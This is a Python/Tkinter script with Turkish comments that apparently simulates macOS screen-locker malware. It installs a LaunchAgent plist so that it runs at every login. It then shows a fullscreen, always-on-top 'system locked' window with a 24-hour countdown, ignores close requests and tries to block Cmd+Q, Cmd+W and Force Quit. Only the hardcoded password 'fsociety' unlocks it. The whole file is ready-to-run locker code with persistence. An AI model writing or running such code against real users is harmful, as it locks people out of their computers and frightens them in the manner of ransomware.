import os
import sys
import tkinter as tk
from tkinter import messagebox
from pathlib import Path

# ---------------------------------------------------------
# 1. macOS BAŞLANGICA EKLENME (LaunchAgent / Plist)
# ---------------------------------------------------------
def mac_baslangica_ekle():
    """macOS üzerinde oturum açıldığında uygulamanın çalışması için LaunchAgent oluşturur."""
    plist_label = "com.simulasyon.kilit"
    launch_agent_dir = Path.home() / "Library" / "LaunchAgents"
    plist_path = launch_agent_dir / f"{plist_label}.plist"

    # Çalıştırılan dosyanın yolunu tespit et
    python_executable = sys.executable
    script_path = os.path.abspath(sys.argv[0])

    plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{plist_label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{python_executable}</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
    try:
        launch_agent_dir.mkdir(parents=True, exist_ok=True)
        if not plist_path.exists():
            with open(plist_path, "w") as f:
                f.write(plist_content)
            print(f"LaunchAgent eklendi: {plist_path}")
    except Exception as e:
        print("Başlangıç kaydı oluşturulurken hata:", e)

# ---------------------------------------------------------
# 2. KİLİT EKRANI ARAYÜZÜ
# ---------------------------------------------------------
class KilitEkraniMac:
    def __init__(self, root):
        self.root = root
        self.root.title("SİSTEM KİLİTLENDİ")
        
        # Tam ekran ve ön planda tutma
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.config(bg="black")

        # Kapatma isteklerini yoksay
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)

        # macOS Kapatma Kısayollarını Yakala ve Engelle (Cmd+q, Cmd+w)
        self.root.bind("<Command-q>", self.kisayol_engelle)
        self.root.bind("<Command-w>", self.kisayol_engelle)
        self.root.bind("<Command-Option-Key-Escape>", self.kisayol_engelle)

        # 24 Saatlik geri sayım (86400 saniye)
        self.kalan_saniye = 86400 
        self.dogru_sifre = "fsociety"

        self.arayuz_kur()
        self.geri_sayim_baslat()

    def kisayol_engelle(self, event=None):
        """Cmd+Q veya Cmd+W gibi kapatma kombinasyonları basıldığında çalışır ve eylemi engeller."""
        return "break" # Tkinter'ın olayı işlemesini durdurur

    def arayuz_kur(self):
        frame = tk.Frame(self.root, bg="black")
        frame.pack(expand=True)

        baslik = tk.Label(
            frame, 
            text="⚠️ SİSTEMİNİZ KİLİTLENDİ ⚠️", 
            font=("Helvetica", 32, "bold"), 
            fg="red", 
            bg="black"
        )
        baslik.pack(pady=20)

        aciklama = tk.Label(
            frame, 
            text="Ekranı açmak için lütfen doğru şifreyi giriniz.\nSüre dolmadan şifreyi giriniz.", 
            font=("Helvetica", 16), 
            fg="white", 
            bg="black"
        )
        aciklama.pack(pady=10)

        self.zaman_label = tk.Label(
            frame, 
            text="24:00:00", 
            font=("Menlo", 52, "bold"), 
            fg="yellow", 
            bg="black"
        )
        self.zaman_label.pack(pady=30)

        self.sifre_entry = tk.Entry(
            frame, 
            font=("Helvetica", 20), 
            show="*", 
            justify="center",
            highlightthickness=2
        )
        self.sifre_entry.pack(pady=10)
        self.sifre_entry.focus()

        buton = tk.Button(
            frame, 
            text="KİLİDİ AÇ", 
            font=("Helvetica", 16, "bold"), 
            bg="red", 
            fg="white", 
            padx=20, 
            pady=8,
            command=self.sifre_kontrol
        )
        buton.pack(pady=10)

        self.root.bind('<Return>', lambda event: self.sifre_kontrol())

    def geri_sayim_baslat(self):
        if self.kalan_saniye > 0:
            saat = self.kalan_saniye // 3600
            dakika = (self.kalan_saniye % 3600) // 60
            saniye = self.kalan_saniye % 60
            
            zaman_str = f"{saat:02d}:{dakika:02d}:{saniye:02d}"
            self.zaman_label.config(text=zaman_str)
            
            self.kalan_saniye -= 1
            self.root.after(1000, self.geri_sayim_baslat)
        else:
            self.zaman_label.config(text="SÜRE DOLDU!")

    def sifre_kontrol(self):
        girilen = self.sifre_entry.get()
        if girilen == self.dogru_sifre:
            messagebox.showinfo("Başarılı", "Şifre doğru! Kilit kaldırılıyor...")
            self.root.destroy()
        else:
            messagebox.showerror("Hata", "Yanlış şifre! Kilit ekranı devam ediyor.")
            self.sifre_entry.delete(0, tk.END)

# ---------------------------------------------------------
# UYGULAMA BAŞLANGICI
# ---------------------------------------------------------
if __name__ == "__main__":
    if sys.platform == "darwin": # Sadece macOS üzerinde çalışıyorsa
        mac_baslangica_ekle()

    root = tk.Tk()
    app = KilitEkraniMac(root)
    root.mainloop()
